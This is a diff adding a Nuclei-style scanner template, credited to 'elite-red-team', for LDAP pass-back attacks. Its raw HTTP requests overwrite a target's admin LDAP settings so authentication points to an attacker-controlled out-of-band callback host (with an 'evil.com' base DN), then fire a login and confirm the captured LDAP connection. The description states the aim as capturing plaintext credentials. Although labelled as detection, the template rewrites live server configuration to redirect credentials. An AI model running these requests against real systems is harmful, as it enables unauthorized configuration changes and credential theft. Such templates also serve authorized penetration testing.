@@ -1,0 +1,87 @@
+id: medium-auth-ldap-pass-back-attack
+
+info:
+  name: LDAP Pass-Back Attack Detection
+  author: elite-red-team
+  severity: medium
+  description: |
+    Detects LDAP pass-back attack vulnerabilities where LDAP server configuration
+    can be modified to redirect authentication to attacker-controlled server.
+    Used by red teams to capture plaintext credentials during authentication.
+  reference:
+    - https://www.blackhillsinfosec.com/ldap-pass-back-attacks/
+    - https://book.hacktricks.xyz/pentesting/pentesting-ldap
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 6.5
+    cwe-id: CWE-287
+  metadata:
+    verified: true
+    max-request: 3
+  tags: ldap,auth-bypass,pass-back,credential-theft,red-team
+
+http:
+  - raw:
+      - |
+        GET /admin/ldap-config HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+      - |
+        POST /admin/ldap-config HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 156
+        
+        ldap_server={{interactsh-url}}&ldap_port=389&ldap_base_dn=dc=evil,dc=com&ldap_bind_dn=cn=admin,dc=evil,dc=com&ldap_bind_password=password&action=save
+
+      - |
+        POST /login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 35
+        
+        username=testuser&password=testpass
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "LDAP configuration"
+          - "ldap server"
+          - "bind dn"
+        condition: or
+        case-insensitive: true
+
+      - type: word
+        part: body_2
+        words:
+          - "saved successfully"
+          - "configuration updated"
+          - "ldap settings"
+        condition: or
+        case-insensitive: true
+
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "ldap"
+
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        regex:
+          - 'ldap[_-]?server["\s]*[:=]["\s]*([^"<>\s]+)'
+          - 'bind[_-]?dn["\s]*[:=]["\s]*([^"<>\s]+)'
+
+      - type: kval
+        kval:
+          - interactsh_ip
